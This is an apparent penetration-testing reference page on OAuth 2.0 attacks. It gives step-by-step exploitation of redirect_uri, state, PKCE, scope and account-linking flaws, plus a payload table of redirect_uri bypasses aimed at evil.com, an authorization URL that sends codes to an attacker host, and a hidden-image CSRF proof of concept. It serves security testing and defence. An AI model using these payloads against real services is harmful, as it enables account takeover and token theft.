# OAuth Attacks

> **Summary**: OAuth 2.0 delegation flaws that allow attackers to steal authorization codes or access tokens, link victim accounts to attacker-controlled identities, or escalate privileges.
> **Impact**: Account takeover, unauthorized API access, CSRF-based account linking, data exfiltration.
> **Typical Severity**: High | Critical

## OAuth 2.0 Flow Overview

### Grant Types

| Grant Type | Use Case | Token Delivery |
|---|---|---|
| Authorization Code | Server-side web apps | Code exchanged server-to-server for token |
| Authorization Code + PKCE | SPAs and mobile apps | Same as above but with code_verifier binding |
| Implicit (deprecated) | Legacy SPAs | Token returned directly in URL fragment |
| Client Credentials | Machine-to-machine | Token issued directly to the client |
| Resource Owner Password (ROPC) | Trusted first-party apps | Username/password sent directly for token |

### Authorization Code Flow (Standard)

1. Client redirects user to IdP: `GET /auth?response_type=code&client_id=<ID>&redirect_uri=<URI>&scope=<SCOPE>&state=<RANDOM>`
2. User authenticates and approves scopes
3. IdP redirects to `redirect_uri` with `?code=<CODE>&state=<STATE>`
4. Client exchanges `code` + `client_secret` server-side for `access_token`
5. Client uses `access_token` to call resource server APIs

### Key Parameters

- **client_id** -- public identifier for the application
- **client_secret** -- confidential key for token exchange (must never reach the browser)
- **redirect_uri** -- callback URL; must match pre-registered value
- **state** -- CSRF token binding the request to the user session
- **scope** -- permissions requested
- **code_verifier / code_challenge** -- PKCE parameters binding code to the original requester
- **response_type** -- `code`, `token`, `id_token`, or combinations
- **response_mode** -- `query`, `fragment`, `form_post`, `web_message`

---

## Detection

### Indicators
- OAuth callback endpoints accepting arbitrary `redirect_uri` values
- Missing or static `state` parameter in authorization requests
- Access tokens appearing in URL query strings or browser history
- Authorization codes that can be reused or have long lifetimes

### Automated Detection
- Burp Suite extensions: **AuthMatrix**, **Authorize**, **OAuth Scanner**
- Nuclei templates for OAuth misconfigurations
- Custom Burp match-and-replace rules to tamper with `redirect_uri`, `state`, `scope`

### Manual Detection
1. Intercept the full OAuth flow in Burp and map every parameter
2. Check if `state` is present, unique per session, and validated on callback
3. Test `redirect_uri` manipulation (subdomain swaps, path traversal, open redirects)
4. Observe where tokens/codes appear (URL, Referer header, JS variables, localStorage)
5. Review `/.well-known/openid-configuration` for registered endpoints and supported flows

---

## Exploitation

### Prerequisites
- Target application uses OAuth 2.0 for authentication or authorization
- Ability to intercept and modify OAuth requests (proxy or attacker-controlled page)

### Step-by-Step Attacks

#### 1. Redirect URI Manipulation (Code/Token Theft)
1. Identify the `redirect_uri` whitelist by testing variations
2. Craft a malicious authorization URL with attacker-controlled `redirect_uri`
3. Send the link to the victim (phishing, XSS, etc.)
4. Victim authenticates; IdP redirects `code` or `token` to attacker endpoint
5. Attacker exchanges the code for an access token
6. **Success**: attacker obtains victim's access token

```
https://idp.example.com/auth?response_type=code&client_id=<CLIENT_ID>&redirect_uri=https://evil.com/callback&scope=openid+profile&state=<STATE>
```

#### 2. State Parameter Bypass (CSRF Account Linking)
1. Attacker initiates OAuth flow with their own IdP account
2. Intercept the callback `?code=<ATTACKER_CODE>&state=<STATE>` and drop the request
3. Deliver the intercepted URL to the victim (via CSRF: iframe, img tag, auto-submitting form)
4. Victim's browser completes the flow, linking attacker's IdP account to victim's app account
5. **Success**: attacker logs in via their own IdP credentials to access victim's account

#### 3. Token Theft via Referer Leakage
1. After OAuth redirect, check if `?code=` or `?access_token=` remains in the URL
2. If the page loads external resources (images, scripts, analytics), the Referer header leaks the code
3. Capture the code from server logs or analytics dashboards
4. **Success**: authorization code recovered from Referer header

#### 4. Authorization Code Reuse / Race Condition
1. Capture a valid authorization code from the OAuth callback
2. Send two simultaneous token exchange requests with the same code (Turbo Intruder)
3. If both succeed, the code is not properly single-use
4. **Success**: multiple tokens minted from one authorization code

#### 5. Scope Manipulation
1. Intercept the authorization request and modify the `scope` parameter
2. Add elevated scopes: `scope=openid+profile+email+admin`
3. If the IdP or app does not enforce scope restrictions, elevated token is issued
4. **Success**: access token with higher privileges than originally consented

#### 6. PKCE Bypass
1. Start an OAuth flow without `code_challenge` and `code_challenge_method`
2. Exchange the resulting code without a `code_verifier`
3. If the server accepts both, PKCE is optional and public clients are vulnerable to code interception
4. **Success**: authorization code can be redeemed by any party

#### 7. Account Takeover via OAuth Linking
1. Attacker creates an account on the IdP (e.g., social provider) using victim's email
2. Or: attacker's IdP account email is changed to victim's email post-registration
3. Victim's app trusts the email claim and links the attacker's IdP identity to the victim's account
4. **Success**: attacker logs in as victim via the OAuth provider

#### 8. Client Secret Brute Force
1. Obtain the `client_id` (public) and a valid `code`
2. Brute-force the `client_secret` in the token exchange request
3. **Success**: attacker can independently exchange codes for tokens

```
POST /token HTTP/1.1
Content-Type: application/x-www-form-urlencoded

code=<CODE>&redirect_uri=<URI>&grant_type=authorization_code&client_id=<ID>&client_secret=<BRUTE_FORCE>
```

### Payloads

#### Redirect URI Bypass Techniques

| Technique | Example |
|---|---|
| Subdomain variation | `https://evil.example.com/callback` |
| Path traversal | `https://example.com/callback/../../../evil` |
| Open redirect chain | `https://example.com/redirect?url=https://evil.com` |
| Parameter pollution | `redirect_uri=https://legit.com&redirect_uri=https://evil.com` |
| Fragment injection | `redirect_uri=https://legit.com%23@evil.com` |
| Localhost lookalike | `https://localhost.evil.com` |
| @ credential trick | `https://legit.com@evil.com` |
| IDN homograph | `https://xn--legit-domain.com` (Unicode lookalike) |
| Wildcard subdomain | `https://attacker.s3.example.com` (dangling DNS) |
| Non-HTTPS downgrade | `http://legit.com/callback` |
| URL encoding | `redirect_uri=https://evil%2Ecom` |

#### Response Mode Manipulation
```
&response_mode=query     # Code in URL query parameter
&response_mode=fragment  # Code in URL fragment (not sent to server)
&response_mode=form_post # Code in POST body
&response_mode=web_message # Code via postMessage
```

### Proof of Concept

**CSRF Account Linking (missing state validation):**
```html
<html>
<body>
  <img src="https://example.com/oauth/callback?code=<ATTACKER_AUTH_CODE>" style="display:none">
  <!-- Or use iframe/auto-submitting form depending on the method -->
</body>
</html>
```

---

## Bypasses

- **Scope filtering bypass**: change scope to invalid value to bypass redirect_uri validation filters
  ```
  &scope=invalid_scope&redirect_uri=https://evil.com
  ```
- **Prompt bypass**: add `&prompt=none` to skip user consent if already authenticated
- **Implicit grant fallback**: change `response_type=code` to `response_type=token` to receive token directly
- **Token in other apps**: use an access token obtained from app A in app B (if audience/client_id not validated)
- **Clickjacking consent dialogs**: frame the IdP authorization page if `X-Frame-Options` / CSP `frame-ancestors` are missing
- **ROPC flow for 2FA bypass**: if ROPC grant is enabled, authenticate with username/password directly, bypassing 2FA prompts
- **Mutable claims attack**: IdP allows user-controlled email changes; app relies on email instead of immutable `sub` claim

---

## Escalation

- **Code theft to full ATO**: stolen authorization code exchanged for access + refresh tokens
- **Refresh token abuse**: long-lived refresh tokens provide persistent access even after password change
- **Scope escalation**: combine with token exchange to escalate from read-only to admin scopes
- **SSRF via Dynamic Client Registration**: `logo_uri`, `jwks_uri`, `sector_identifier_uri` in `/register` endpoint can trigger server-side requests
- **Cloud metadata pivot**: OAuth tokens with excessive scopes (e.g., AWS Cognito) may allow modifying user attributes, leading to account takeover of other users
- **OAuth Discovery RCE**: desktop OAuth clients that open `authorization_endpoint` from discovery metadata without validation can be tricked into executing `file://` or custom scheme URIs

---

## Tools

| Tool | Usage |
|---|---|
| Burp Suite | Intercept and modify OAuth flows, test redirect_uri and state |
| [Authorize (Burp Extension)](https://portswigger.net/bappstore) | Automated authorization testing |
| [oauth-tools](https://github.com/nicerobot/oauth-tools) | CLI-based OAuth flow testing |
| [JWT Tool](https://github.com/ticarpi/jwt_tool) | Analyze and tamper with OAuth JWTs |
| Turbo Intruder | Race condition testing on code exchange |
| Nuclei | Template-based scanning for OAuth misconfigurations |
| Browser DevTools | Inspect URL fragments, Referer headers, localStorage for token leaks |

---

## Related

- [Open Redirect](../vulns/open-redirect.md) -- chaining open redirects with redirect_uri bypass
- [CSRF](../vulns/csrf.md) -- state parameter bypass enables CSRF-based account linking
- [Account Takeover](../vulns/account-takeover.md) -- OAuth as an ATO vector
- [JWT Attacks](jwt.md) -- OAuth access tokens are often JWTs
- [SSRF](../vulns/ssrf.md) -- Dynamic Client Registration SSRF vectors
- [Clickjacking](../vulns/clickjacking.md) -- framing OAuth consent dialogs

---

## References

- [HackTricks - OAuth to Account Takeover](https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover)
- [Detectify - Account Hijacking Using Dirty Dancing in Sign-in OAuth Flows](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/)
- [PortSwigger - Hidden OAuth Attack Vectors](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [Doyensec - OAuth Common Vulnerabilities](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [NCC Group - Offensive Guide to Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [RFC 6749 - OAuth 2.0 Authorization Framework](https://www.rfc-editor.org/rfc/rfc6749)
- [RFC 7636 - PKCE](https://www.rfc-editor.org/rfc/rfc7636)
- [Salt Security - Oh-Auth: Abusing OAuth to Take Over Millions of Accounts](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts)
